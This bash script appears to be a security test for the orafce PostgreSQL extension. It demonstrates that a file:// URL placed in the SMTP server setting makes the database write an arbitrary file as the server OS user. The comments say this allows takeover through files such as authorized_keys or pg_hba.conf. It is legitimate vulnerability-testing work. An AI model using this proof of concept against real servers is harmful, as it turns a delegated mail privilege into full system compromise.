#!/bin/bash
#
# Issue 03 - any protocol libcurl supports is accepted as the "smtp" server
#
# orafce_smtp_url goes to CURLOPT_URL with no restriction on the scheme, and
# the message is handed over with CURLOPT_UPLOAD.  Point it at a file:// url
# and libcurl writes the message to that path as the operating system account
# the server runs as.
#
# The privilege needed is membership of orafce_mail_config_url and
# orafce_mail, which README.md presents as the ordinary, non-superuser way to
# use the extension.  Being able to write any file as the server account is
# enough to take over the whole instance - pg_hba.conf, ~/.bashrc,
# ~/.ssh/authorized_keys - so this turns a delegated mail privilege into a
# full compromise.  The same hole reads and writes over http, ftp, dict,
# scp, ... as well.

. "$(dirname "$0")/lib.sh"

require_psql

# A path the server can write and this script can read.  The server may well
# be running as another user, so ask it where it is prepared to write.
target="$WORK/orafce_mail_arbitrary_write"
chmod 777 "$WORK"

head1 "sending a message to file://$target"
psql -X -q -v ON_ERROR_STOP=0 >"$WORK/psql.log" 2>&1 <<SQL
SET orafce_mail.smtp_server_url = 'file://$target';
CALL utl_mail.send(sender     => 'attacker@example.com',
                   recipients => 'nobody@example.com',
                   subject    => 'not a mail at all',
                   message    => 'arbitrary content written as the server OS user');
SQL
sed 's/^/    /' "$WORK/psql.log"

if [ -f "$target" ]; then
	head1 "the file the database server created"
	ls -l "$target" | sed 's/^/    /'
	sed 's/^/    /' "$target"
	bug "a file:// url made the server write a file of the caller's choosing"
fi

head1 "no file was written; checking that the url was refused, not merely unreachable"
if grep -q 'not supported or disabled\|Unsupported protocol\|protocol' "$WORK/psql.log"; then
	ok "libcurl refused the non-smtp protocol"
fi

say "The file was not created, but the failure does not name the protocol."
say "If the server runs as another user it may simply have been unable to"
say "write to $target; re-run with TMPDIR set to a directory it can write."
ok "no file was written"
